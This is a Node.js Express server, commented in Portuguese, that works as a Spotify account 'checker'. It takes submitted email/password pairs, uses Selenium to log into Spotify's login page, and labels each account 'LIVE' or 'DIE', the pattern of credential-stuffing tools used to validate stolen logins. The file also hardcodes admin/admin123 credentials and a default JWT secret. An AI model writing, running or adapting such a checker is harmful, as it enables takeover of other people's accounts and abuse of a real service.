import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';
import jwt from 'jsonwebtoken'; // Importando o JWT

const app = express();
const port = 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'seuSegredoAqui'; // Defina sua chave secreta do JWT

// Middleware para processar JSON
app.use(bodyParser.json());

// Middleware de autenticação JWT
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1]; // Extrai o token do cabeçalho

    if (!token) {
        return res.status(403).json({ message: 'Acesso negado, token não fornecido.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Token inválido ou expirado.' });
        }
        req.user = user; // Adiciona o usuário ao objeto de requisição
        next();
    });
};

// Endpoint para verificar login no Spotify, protegido por JWT
app.post('/api/check-spotify', authenticateJWT, async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // Navegar até a página principal do Spotify
        await driver.get('https://accounts.spotify.com/pt-BR/login');

        // Inserir email e senha
        let inputEmail = await driver.wait(until.elementLocated(By.id('login-username')), 10000);
        let inputPassw = await driver.wait(until.elementLocated(By.id('login-password')), 10000);
        let btnLogin = await driver.wait(until.elementLocated(By.id('login-button')), 10000);

        await inputEmail.sendKeys(email);
        await inputPassw.sendKeys(password);

        // Clicar no botão de login
        await btnLogin.click();

        await driver.sleep(3000);

        // Verificar se o login foi bem-sucedido
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        let url = await driver.getCurrentUrl();

        if (text.includes('Email ou senha incorretos.')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ Email ou senha incorretos ]`));
            return res.json({ status: 'DIE', message: `Login inválido para o email: ${email}` });
        } else if (url === 'https://www.spotify.com/pt-BR/account/overview/') {
            console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
            return res.json({ status: 'LIVE', message: `Login bem-sucedido para o email: ${email}` });
        }

    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Erro ao tentar fazer login: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao tentar fazer login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Endpoint para gerar o token JWT
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Exemplo simples de autenticação, adicione sua lógica de verificação aqui
    if (username === 'admin' && password === 'admin123') {
        // Gera um token JWT válido por 1 hora
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        return res.json({ token });
    } else {
        return res.status(401).json({ message: 'Credenciais inválidas.' });
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API do Spotify rodando em http://localhost:${port}`);
});
